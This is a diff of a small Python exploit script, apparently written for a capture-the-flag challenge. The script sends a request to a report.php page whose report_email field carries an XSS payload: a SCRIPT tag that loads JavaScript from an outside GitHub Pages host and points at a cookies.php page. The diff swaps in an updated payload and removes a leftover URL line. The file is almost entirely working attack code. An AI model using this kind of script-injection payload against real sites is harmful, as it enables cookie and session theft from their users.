@@ -13,11 +13,10 @@ headers = {
 }
 
 params = {
-    'report_url': """http://host3.metaproblems.com:6020/report.php?report_url=http%3A%2F%2Fhost3.metaproblems.com%3A6020%2Fcookies.php&report_email="<SCRIPT/SRC='https://amazingrupak.github.io/'></SCRIPT>"@a.com""",
-    'report_email': "a@a.com",
+    'report_url': """http://host3.metaproblems.com:6020/report.php?report_url=http%3A%2F%2Fhost3.metaproblems.com%3A6020%2Fcookies.php&report_email="<SCRIPT/SRC='https://amazingrupak.github.io/hi.js'></SCRIPT>"@hi.com""",
+    'report_email': "hi@hi.com",
 }
 
 r = requests.get('http://host3.metaproblems.com:6020/report.php', params=params, headers=headers)
 
 print(r.text)
-http://host3.metaproblems.com:6020/report.php?report_url=http%3A%2F%2Fhost3.metaproblems.com%3A6020%2Fcookies.php&report_email="<SCRIPT/SRC='http://amazingrupak.github.io'></SCRIPT>"@a.com
